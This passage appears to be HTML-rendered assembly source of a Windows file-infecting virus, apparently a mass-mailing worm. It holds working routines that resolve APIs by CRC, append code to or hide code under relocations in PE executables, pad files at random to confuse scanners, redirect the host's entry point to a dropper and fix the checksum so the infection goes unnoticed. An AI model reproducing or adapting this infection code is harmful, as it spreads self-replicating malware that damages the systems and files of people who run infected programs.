        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kGlobalFree</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_krncrc</span><span class="sc0">
</span><span class="sc5">cGlobalFree</span><span class="sc0">             </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">cGlobalAlloc</span><span class="sc0">            </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kGlobalAlloc</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_krncrc</span><span class="sc0">
</span><span class="sc5">cGlobalAlloc</span><span class="sc0">            </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">cGetVersion</span><span class="sc0">             </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kGetVersion</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_krncrc</span><span class="sc0">
</span><span class="sc5">cGetVersion</span><span class="sc0">             </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">cCreateThread</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kCreateThread</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_krncrc</span><span class="sc0">
</span><span class="sc5">cCreateThread</span><span class="sc0">           </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">cCloseHandle</span><span class="sc0">            </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kCloseHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">cCloseHandle</span><span class="sc0">            </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">call_krncrc</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">store_krnapi</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'!bgr'</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">call_krncrc</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;infect file in two parts</span><span class="sc0">
</span><span class="sc1">;algorithm:     increase file size by random amount (RANDPADMIN-RANDPADMAX</span><span class="sc0">
</span><span class="sc1">;               bytes) to confuse scanners that look at end of file (also</span><span class="sc0">
</span><span class="sc1">;               infection marker)</span><span class="sc0">
</span><span class="sc1">;               if reloc table is not in last section (taken from relocation</span><span class="sc0">
</span><span class="sc1">;               field in PE header, not section name), then append to last</span><span class="sc0">
</span><span class="sc1">;               section.  otherwise, move relocs down and insert code into</span><span class="sc0">
</span><span class="sc1">;               space (to confuse people looking at end of file.  they will</span><span class="sc0">
</span><span class="sc1">;               see only relocation data and garbage or many zeroes)</span><span class="sc0">
</span><span class="sc1">;               entry point is altered to point to some code.  very simple</span><span class="sc0">
</span><span class="sc1">;               however, that code just drops exe and returns</span><span class="sc0">
</span><span class="sc1">;               exe contains infection routine</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">infect_file</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;esi -&gt; findlist, edi = map view</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">open_append</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mzhdr.mzlfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pecoff.pesectcount</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">pesect</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pecoff.peopthdrsize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pemagic</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">pesect</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pesect.sectrawsize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_codeend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pefilealign</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                        </span><span class="sc1">;file align last section</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pesect.sectrawsize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pesect.sectrawaddr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;raw size is file aligned.  virtual size is not required to be section aligned</span><span class="sc0">
</span><span class="sc1">;so if old virtual size is larger than new raw size, then size of image does</span><span class="sc0">
</span><span class="sc1">;not need to be updated, else virtual size must be large enough to cover the</span><span class="sc0">
</span><span class="sc1">;new code, and size of image is section aligned</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pesect.sectvirtaddr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pesect.sectrawaddr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pesect.sectvirtsize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pesect.sectrawaddr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">test_reloff</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pesect.sectvirtsize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pesect.sectrawaddr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pesectalign</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.peimagesize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;if relocation table is not in last section, then append to last section</span><span class="sc0">
</span><span class="sc1">;otherwise, move relocations down and insert code into space</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">test_reloff</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pecoff.peflags</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_RELOCS_STRIPPED</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">copy_code</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pereloc.dirrva</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">copy_code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pesect.sectvirtsize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pesect.sectrawaddr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pereloc.dirrva</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">copy_code</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pereloc.dirrva</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">std</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movs</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">copy_code</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">401000h</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movs</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;alter entry point</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.peentrypoint</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_patch</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.peentrypoint</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pechksum</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_patch</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_codeend</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;CheckSumMappedFile() - simply sum of all words in file, then adc filesize</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">infect_ret</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">

</span><span class="sc5">calc_checksum</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">calc_checksum</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;avoid common bug.  ADC not ADD</span><span class="sc0">

</span><span class="sc5">infect_ret</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">                               </span><span class="sc1">;common exit using SEH</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"*4U2NV*"</span><span class="sc0">                       </span><span class="sc1">;that is, unless you're reading this</span><span class="sc0">
</span><span class="sc5">test_infect</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">regdll</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"advapi32"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;place &lt; 80h bytes from end for smaller code</span><span class="sc0">

</span><span class="sc5">mail_recip</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;virtual buffer, 80h bytes</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"'"</span><span class="sc0">                             </span><span class="sc1">;address sentinel - do not remove!</span><span class="sc0">

</span><span class="sc5">junkhtml_codeend</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
</span><span class="sc5">junkhtml_inf</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc9">endif</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">dropper</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part43</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">smtp1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
